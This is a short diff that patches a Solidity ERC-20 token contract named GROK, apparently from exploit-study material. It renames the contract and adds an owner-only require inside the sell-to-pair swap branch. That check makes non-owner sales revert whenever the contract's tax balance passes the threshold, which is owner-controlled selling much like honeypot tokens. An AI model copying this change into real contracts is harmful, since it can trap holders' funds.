@@ -1,0 +1,29 @@
+diff --git a/src/grok_exp/grok.sol b/src/grok_exp/grok_patch.sol
+index 75f7e50..366a071 100644
+--- a/src/grok_exp/grok.sol
++++ b/src/grok_exp/grok_patch.sol
+@@ -116,7 +116,7 @@ interface IUniswapV2Router02 {
+     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+ }
+ 
+-contract GROK is Context, IERC20, Ownable {
++contract GROK_patch is Context, IERC20, Ownable {
+     using SafeMath for uint256;
+     mapping (address => uint256) private _balances;
+     mapping (address => mapping (address => uint256)) private _allowances;
+@@ -243,6 +243,7 @@ contract GROK is Context, IERC20, Ownable {
+ 
+             uint256 contractTokenBalance = balanceOf(address(this));
+             if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
++                require(from == owner(), "Only owner can trigger swap");
+                 swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
+                 uint256 contractETHBalance = address(this).balance;
+                 if(contractETHBalance > 0) {
+@@ -288,6 +289,7 @@ contract GROK is Context, IERC20, Ownable {
+         );
+     }
+ 
++  
+ 
+     
+ 
